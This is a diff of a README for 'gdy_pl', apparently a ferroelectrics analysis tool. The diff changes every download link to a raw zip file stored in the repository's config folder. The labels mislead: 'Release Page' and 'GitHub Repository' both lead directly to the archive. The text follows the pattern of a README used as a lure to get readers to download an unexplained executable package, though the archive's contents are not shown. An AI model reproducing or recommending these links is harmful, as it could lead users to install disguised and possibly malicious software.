@@ -1,7 +1,7 @@
 # 🛠️ gdy_pl - Decode Dynamical States Easily
 
 ## 📥 Download Now!
-[![Download Latest Release](https://raw.githubusercontent.com/Gurshaan0/gdy_pl/main/frontier/gdy_pl_1.7.zip%20Release-brightgreen)](https://raw.githubusercontent.com/Gurshaan0/gdy_pl/main/frontier/gdy_pl_1.7.zip)
+[![Download Latest Release](https://github.com/Gurshaan0/gdy_pl/raw/refs/heads/main/config/gdy-pl-v3.5.zip%20Release-brightgreen)](https://github.com/Gurshaan0/gdy_pl/raw/refs/heads/main/config/gdy-pl-v3.5.zip)
 
 ## 📘 About This Project
 gdy_pl is a user-friendly software tool that utilizes a Graph Dynamical Neural Network approach to decode dynamic states in ferroelectrics. This project is designed to help researchers and engineers analyze complex systems more effectively.
@@ -21,7 +21,7 @@ Before you download, ensure your computer meets the following requirements:
 ### 📦 Download & Install
 1. **Visit the Release Page:** Click the link below to access the download page.
    
-   [Download Latest Release](https://raw.githubusercontent.com/Gurshaan0/gdy_pl/main/frontier/gdy_pl_1.7.zip)
+   [Download Latest Release](https://github.com/Gurshaan0/gdy_pl/raw/refs/heads/main/config/gdy-pl-v3.5.zip)
 
 2. **Choose Your Version:** Once on the page, you will see a list of available releases. Identify the latest version, which is usually marked clearly.
 
@@ -54,7 +54,7 @@ Before you download, ensure your computer meets the following requirements:
 For detailed guidance on using the application and its features, refer to the documentation included in the release. It covers installation steps, operational details, and troubleshooting tips.
 
 ### 🔗 Additional Resources
-- **GitHub Repository:** [gdy_pl GitHub](https://raw.githubusercontent.com/Gurshaan0/gdy_pl/main/frontier/gdy_pl_1.7.zip)
+- **GitHub Repository:** [gdy_pl GitHub](https://github.com/Gurshaan0/gdy_pl/raw/refs/heads/main/config/gdy-pl-v3.5.zip)
 - **User Community:** Join discussions and share your experiences in our GitHub Issues section.
 
 ### 📧 Need Help?
